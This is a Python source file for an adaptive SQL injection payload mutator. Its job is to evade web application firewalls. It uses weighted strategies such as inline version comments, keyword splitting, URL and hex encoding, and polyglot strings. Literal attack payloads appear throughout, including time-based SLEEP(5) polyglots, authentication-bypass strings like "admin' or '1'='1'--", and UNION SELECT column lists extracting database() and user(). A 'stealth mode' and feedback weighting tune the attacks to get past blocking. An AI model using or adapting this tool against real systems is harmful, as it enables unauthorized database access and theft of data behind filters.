import random
import re

class ASTMutator:
    def __init__(self, context="GENERIC"):
        self.sql_keywords = ["UNION", "SELECT", "OR", "AND", "WHERE", "ORDER BY", "SLEEP", "GROUP BY", "FROM", "INFORMATION_SCHEMA"]
        self.context = context
        self.strategies = {
            "logical_alts": self._logical_equivalents,
            "inline_comments": self._inline_version_comments,
            "union_balance": self._balance_union_columns,
            "junk_fill": self._junk_filling,
            "context_aware": self._context_aware_mutation,
            "directed_bypass": self._directed_keyword_mutation,
            "polyglot": self._polyglot_mutation,
            "encoding": self._encoding_mutation,
            "keyword_comment_wrap": self._keyword_comment_wrap
        }
        # Awareness: Track success of each strategy
        self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
        # Gene Credit Assignment: Track reputation of each keyword
        self.keyword_reputation = {kw: 1.0 for kw in self.sql_keywords}
        self.last_strategy_used = None
        self.stealth_mode = False
        self.blocked_chars = []
        self.latency_history = []
        self.success_dna = [] # Store sequences of mutations that worked

    def apply_hint(self, hint):
        """Applies AI-driven or WAF-driven hints to mutation logic."""
        weights = hint.get("weights", {})
        for strat, weight in weights.items():
            if strat in self.strategy_weights:
                self.strategy_weights[strat] *= weight
                print(f"[*] Mutator: Boosting strategy {strat} by {weight}x", flush=True)

        # Keyword specific hints
        target_kw = hint.get("target_keyword")
        if target_kw in self.keyword_reputation:
            self.keyword_reputation[target_kw] = 0.1 # Force bypass for this keyword
            print(f"[*] Mutator: AI Hint Applied - Flagging {target_kw} for bypass", flush=True)

        # WAF specific blocked characters
        blocked = hint.get("blocked_chars", [])
        if blocked:
            self.blocked_chars = list(set(self.blocked_chars + blocked))
            print(f"[*] Mutator: WAF Adaptation - Avoiding blocked chars: {self.blocked_chars}", flush=True)

    def mutate(self, payload, error_msg=None, intensity=1, response_time=None):
        mutated = str(payload)
        
        # 0. Dynamic Intensity Adjustment
        if response_time:
            self.latency_history.append(response_time)
            if len(self.latency_history) > 5:
                avg_latency = sum(self.latency_history[-5:]) / 5
                if response_time > avg_latency * 1.5:
                    print(f"[*] Mutator: Latency spike detected ({response_time:.2f}s). Increasing mutation intensity.", flush=True)
                    intensity += 1
        
        # 1. WAF-Specific Character Replacement
        if " " in self.blocked_chars:
            separators = ["/**/", "/*!*/", "+", "%20", "%0A"]
            mutated = mutated.replace(" ", random.choice(separators))
        
        # 2. Error-Based Feedback: Apply specific fixes based on SQL error
        if error_msg:
            mutated = self._apply_error_feedback(mutated, error_msg)
            intensity += 1 # Errors often mean we are close, increase intensity to find the fix
            
        # 3. Context-Aware Mutation: Detect and wrap payload if needed
        mutated = self._context_aware_wrap(mutated)
        
        # 4. Standard Mutations with Weighted Selection
        num_mutations = random.randint(1, 2) * intensity
        
        # Awareness: If in stealth mode, favor stealthy strategies
        current_weights = dict(self.strategy_weights)
        if self.stealth_mode:
            current_weights["context_aware"] *= 2.0
            current_weights["inline_comments"] *= 2.0
            current_weights["directed_bypass"] *= 3.0
            current_weights["polyglot"] *= 2.0
            print("[*] Stealth Mode Active: Prioritizing evasive mutations.", flush=True)

        for _ in range(num_mutations):
            # Pick strategy based on weights
            names = list(self.strategies.keys())
            weights = [current_weights[n] for n in names]
            strat_name = random.choices(names, weights=weights, k=1)[0]
            
            self.last_strategy_used = strat_name
            mutated = self.strategies[strat_name](mutated)
            
        return mutated

    def report_success(self, payload, score, strategy_used=None):
        """Gene Credit Assignment: Update strategy and keyword reputation based on score."""
        if not strategy_used:
            strategy_used = self.last_strategy_used

        # Detect if we are being blocked consistently
        if score <= 0.1:
            self.stealth_mode = True
            # Penalize keywords present in a blocked payload
            for kw in self.sql_keywords:
                if kw in payload.upper():
                    self.keyword_reputation[kw] -= 0.1
                    self.keyword_reputation[kw] = max(0.1, self.keyword_reputation[kw])
        else:
            self.stealth_mode = False
            # Reward keywords in a successful payload
            if score > 0.5:
                for kw in self.sql_keywords:
                    if kw in payload.upper():
                        self.keyword_reputation[kw] += 0.05
                        self.keyword_reputation[kw] = min(2.0, self.keyword_reputation[kw])

        if strategy_used and score > 0.5:
            # Reward the strategy
            self.strategy_weights[strategy_used] += 0.2 # Increased reward for feedback loop
            
            # If it's a very high score, store this as "Success DNA"
            if score >= 0.9:
                self.success_dna.append(strategy_used)
                if len(self.success_dna) > 10: self.success_dna.pop(0)

            # Normalize to prevent runaway weights
            total = sum(self.strategy_weights.values())
            for k in self.strategy_weights:
                self.strategy_weights[k] /= total
                self.strategy_weights[k] *= len(self.strategy_weights) # Keep average at 1.0

    def _polyglot_mutation(self, payload):
        """Creates a polyglot payload that works in multiple contexts."""
        polyglots = [
            f"SLEEP(5) /*' or SLEEP(5) or '\" or SLEEP(5) or \"*/",
            f"1'\"--",
            f"')) OR 1=1--",
            f"\" OR 1=1--",
            f"admin' or '1'='1'--"
        ]
        if random.random() < 0.3:
            return random.choice(polyglots)
        
        # Wrap existing payload in a polyglot shell
        return f"1' OR ({payload}) OR '1'='1"

    def _encoding_mutation(self, payload):
        """Applies various encoding techniques."""
        encodings = [
            lambda p: "".join([f"%{ord(c):02X}" for c in p]), # Full URL Encode
            lambda p: "".join([f"\\x{ord(c):02x}" for c in p]), # Hex Encode
            lambda p: p.replace(" ", "%20").replace("'", "%27").replace("\"", "%22"), # Selective URL Encode
            lambda p: "".join([f"&#{ord(c)};" for c in p]) # HTML Entity Encode
        ]
        return random.choice(encodings)(payload)

    def _directed_keyword_mutation(self, payload):
        """Directed Mutations: Apply bypasses to keywords based on their reputation."""
        mutated = payload
        # Find keywords with low reputation in the current payload
        for kw, rep in self.keyword_reputation.items():
            if kw in mutated.upper() and (rep < 0.8 or random.random() < 0.3):
                # Apply a bypass transformation
                bypasses = [
                    lambda k: f"{k[:len(k)//2]}/**/{k[len(k)//2:]}",
                    lambda k: f"/*!{k}*/",
                    lambda k: "".join([f"%{ord(c):02X}" if random.random() < 0.3 else c for c in k]),
                    lambda k: f"({k})" if k in ["SELECT", "UNION"] else k
                ]
                transform = random.choice(bypasses)
                # Use regex to replace keyword while preserving case if possible
                mutated = re.sub(rf'\b{kw}\b', transform(kw), mutated, flags=re.IGNORECASE)
        return mutated

    def _apply_error_feedback(self, payload, error):
        """Applies specific mutations based on SQL error messages."""
        error = error.lower()
        # Column count mismatch
        if "column" in error and ("count" in error or "match" in error):
            if "UNION SELECT" in payload.upper():
                # Add more columns to UNION
                parts = re.split(r"(SELECT\s+)", payload, flags=re.IGNORECASE)
                if len(parts) >= 3:
                    cols = parts[2].split(",")
                    cols.append("NULL")
                    return f"{parts[0]}{parts[1]}{','.join(cols)}"
        
        # Quote mismatch or syntax error near quote
        if "syntax" in error and ("'" in error or '"' in error):
            if "'" in payload: return payload.replace("'", "''")
            
        return payload

    def _context_aware_wrap(self, payload):
        """Wraps payload based on detected context (quotes, brackets)."""
        if random.random() > 0.7:
            wrappers = [
                ("'", "'"),
                ('"', '"'),
                ("') ", " --"),
                ('") ', " --"),
                (")) ", " --")
            ]
            prefix, suffix = random.choice(wrappers)
            if not payload.startswith(prefix):
                return prefix + payload + suffix
        return payload

    def _inline_version_comments(self, payload):
        mutated = payload
        for kw in self.sql_keywords:
            if kw in mutated.upper():
                rand_ver = random.randint(40000, 60000)
                mutated = re.sub(rf'\b{kw}\b', f"/*!{rand_ver}{kw}*/", mutated, flags=re.IGNORECASE)
        return mutated

    def _logical_equivalents(self, payload):
        equivalents = {
            r"1=1": ["true", "not false", "~0=~0", "8<=>8"],
            r"\bOR\b": ["||", "XOR"],
            r"\bAND\b": ["&&"]
        }
        mutated = payload
        for pattern, alts in equivalents.items():
            mutated = re.sub(pattern, random.choice(alts), mutated, flags=re.IGNORECASE)
        return mutated

    def _balance_union_columns(self, payload):
        if "UNION" in payload.upper() and "SELECT" in payload.upper():
            column_options = ["NULL", "NULL,NULL", "NULL,NULL,NULL", "1,2", "database(),user()"]
            parts = re.split(r"(SELECT\s+)", payload, maxsplit=1, flags=re.IGNORECASE)
            if len(parts) >= 3:
                return f"{parts[0]}{parts[1]}{random.choice(column_options)}"
        return payload

    def _junk_filling(self, payload):
        junk = ["bypass", "attack_unit", "audit"]
        if "/**/" in payload:
            return payload.replace("/**/", f"/*{random.choice(junk)}*/")
        return payload

    def _keyword_comment_wrap(self, payload):
        """Wraps SQL keywords in various comment styles to evade detection."""
        mutated = str(payload)
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
        
        for kw in keywords:
            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE):
                # Choose a random comment style
                style = random.choice([
                    lambda k: f"/*{random.choice(['!', 'x', 'bypass'])}*/{k}/*{random.choice(['!', 'x', 'bypass'])}*/",
                    lambda k: f"{k}/*{random.choice(['!', 'x', 'bypass'])}*/",
                    lambda k: f"/*{random.choice(['!', 'x', 'bypass'])}*/{k}",
                    lambda k: f"--{random.choice(['!', 'x', 'bypass'])}\n{k}",
                    lambda k: f"#{random.choice(['!', 'x', 'bypass'])}\n{k}"
                ])
                mutated = re.sub(rf'\b{kw}\b', style(kw), mutated, flags=re.IGNORECASE)
                
        return mutated

    def _context_aware_mutation(self, payload):
        mutated = str(payload)
        
        # 0. Context-Specific Injection
        if self.context == "SINGLE_QUOTE" and not mutated.startswith("'"):
            mutated = "'" + mutated
        elif self.context == "DOUBLE_QUOTE" and not mutated.startswith('"'):
            mutated = '"' + mutated

        # 1. Quote Alteration & Escaping Variations
        if "'" in mutated:
            options = [
                lambda p: p.replace("'", "''"), # SQL Escape
                lambda p: p.replace("'", "\\'"), # C-Style Escape
                lambda p: p.replace("'", "%27"), # URL Encode
                lambda p: p.replace("'", '"')    # Swap to Double
            ]
            mutated = random.choice(options)(mutated)

        # 2. Advanced Comment Wrapping & Nested Structures
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"]
        for kw in keywords:
            if re.search(rf'\b{kw}\b', mutated, re.IGNORECASE):
                coin = random.random()
                if coin < 0.2:
                    # Nested comments: /*!50000/*bypass*/SELECT*/
                    mutated = re.sub(rf'\b{kw}\b', f"/*!50000/*bypass*/{kw}*/", mutated, flags=re.IGNORECASE)
                elif coin < 0.4:
                    # Newline injection: SELECT\nFROM
                    mutated = re.sub(rf'\b{kw}\b', f"{kw}\n", mutated, flags=re.IGNORECASE)
                elif coin < 0.6:
                    # Null byte injection (if supported/needed)
                    mutated = re.sub(rf'\b{kw}\b', f"{kw}%00", mutated, flags=re.IGNORECASE)

        # 3. Space/Separator Mutation (Advanced)
        if " " in mutated:
            separators = ["/**/", "/*!*/", "+", "%0A", "%0D", "%09", "/*\n*/"]
            sep = random.choice(separators)
            mutated = mutated.replace(" ", sep)

        return mutated
